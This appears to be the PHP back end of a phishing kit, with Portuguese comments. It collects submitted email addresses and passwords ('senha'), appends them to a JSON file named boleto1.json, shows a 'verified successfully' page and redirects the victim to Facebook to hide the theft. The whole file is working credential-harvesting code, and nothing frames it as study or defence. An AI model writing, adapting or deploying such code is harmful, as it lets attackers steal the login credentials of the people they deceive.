<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verificar se os dados do formulário foram recebidos
    var_dump($_POST); 
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $senha = isset($_POST['senha']) ? $_POST['senha'] : '';

    echo "Email: " . $email . "<br>";
    echo "Senha: " . $senha . "<br>";

    // Verificar se ambos os campos foram preenchidos
    if ($email && $senha) {
        // Caminho para o arquivo JSON
        $fl = "./operador/seguro/boleto1.json";



        // Verificar se o arquivo existe
        if (file_exists($fl)) {
            // Abrir o arquivo para leitura
            $h = fopen($fl, "r");
            // Ler o conteúdo do arquivo
            $arr = json_decode(fread($h, filesize($fl)), true);
            fclose($h);
        } else {
            // Se o arquivo não existir, criar um array vazio
            $arr = [];
        }

        // Adicionar os dados do usuário (email e senha) no array
        array_push($arr, array("email" => $email, "senha" => $senha));

        // Gravar os dados no arquivo JSON
        $fhs = fopen($fl, 'w') or die("Can't open file");
        fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT));
        fclose($fhs);

        echo "Dados recebidos e salvos com sucesso!";
    } else {
        echo "Erro: dados não recebidos corretamente.";
    }
}
?>

<!DOCTYPE html>
<html>
<head> 
  <title>Verificado com sucesso </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="2;url='https://www.facebook.com/site'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
</head>
</html>
